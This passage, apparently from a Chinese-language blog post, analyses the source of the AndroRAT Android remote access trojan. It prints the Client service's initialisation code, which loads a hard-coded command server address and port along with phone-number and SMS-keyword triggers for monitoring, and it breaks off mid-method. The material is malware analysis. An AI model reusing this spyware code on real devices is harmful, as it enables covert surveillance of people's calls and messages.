&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onCreate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;In onCreate&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;infos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SystemInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;procCmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProcessCommand&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		
		&lt;span class=&quot;n&quot;&gt;loadPreferences&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;进行了几步初始化操作，SystemInfo类是用于读取系统信息的类，ProcessCommand类则是用于处理Server发送的命令的类，loadPrefererences用于初始化各个参数，我们来看它的代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;loadPreferences&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;PreferencePacket&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;procCmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadPreferences&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;waitTrigger&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isWaitTrigger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getIp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getPort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;authorizedNumbersCall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getPhoneNumberCall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;authorizedNumbersSMS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getPhoneNumberSMS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;authorizedNumbersKeywords&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getKeywordSMS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;使用ProcessCommand的loadPreference方法通过读取perference设置的内容来初始化监控信息，包括Server的ip和port、指定是否开启来电或短信提醒触发Client启动、指定特别关注的号码电话或者短信、指定监听特定关键字短信，然后将内容添加到成员变量当中。其中perference的设置需要在连接Server时被远程设定，所以默认初始的ip和port都是被直接写在代码中的。下面为ProcessCommand的loadPreference方法详细代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PreferencePacket&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;loadPreferences&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;PreferencePacket&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PreferencePacket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		
		&lt;span class=&quot;n&quot;&gt;SharedPreferences&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSharedPreferences&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;preferences&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setIp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ip&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;172.16.1.60&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;port&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7777&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setWaitTrigger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getBoolean&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;waitTrigger&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
		
		&lt;span class=&quot;n&quot;&gt;ArrayList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smsKeyWords&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ArrayList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keywords&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;smsKeyWords&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keywords&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;smsKeyWords&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;StringTokenizer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;st&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StringTokenizer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keywords&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;st&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hasMoreTokens&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;smsKeyWords&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;st&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;nextToken&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setKeywordSMS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smsKeyWords&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		
		&lt;span class=&quot;n&quot;&gt;ArrayList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;whiteListCall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ArrayList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;listCall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;numCall&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listCall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;whiteListCall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;StringTokenizer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;st&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StringTokenizer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listCall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;st&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hasMoreTokens&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;whiteListCall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;st&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;nextToken&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setPhoneNumberCall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;whiteListCall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		
		
		&lt;span class=&quot;n&quot;&gt;ArrayList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;whiteListSMS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ArrayList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;listSMS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;numSMS&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listSMS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;whiteListSMS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;StringTokenizer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;st&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StringTokenizer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listSMS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;st&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hasMoreTokens&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;whiteListSMS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;st&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;nextToken&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setPhoneNumberSMS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;whiteListSMS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;之后根据我们前面分析的BootReceiver和AndroratActivity可以知道Client服务的启动是靠startService方法来启动的，而这个方法会触发Client的onStartCommand的方法。下面我们来一段一段的来分析这个方法，先来看第一段：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onStartCommand&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Intent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;startId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;//toast = Toast.makeText(this	,&quot;Prepare to laod&quot;, Toast.LENGTH_LONG);&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;//loadPreferences(&quot;preferences&quot;);&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;//Intent i = new Intent(this,Preferences.class);&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;//startActivity(i);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;intent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;START_STICKY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;who&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;onStartCommand by: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;who&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//On affiche qui a déclenché l'event&lt;/span&gt;
		
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hasExtra&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IP&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getExtras&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IP&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hasExtra&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PORT&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
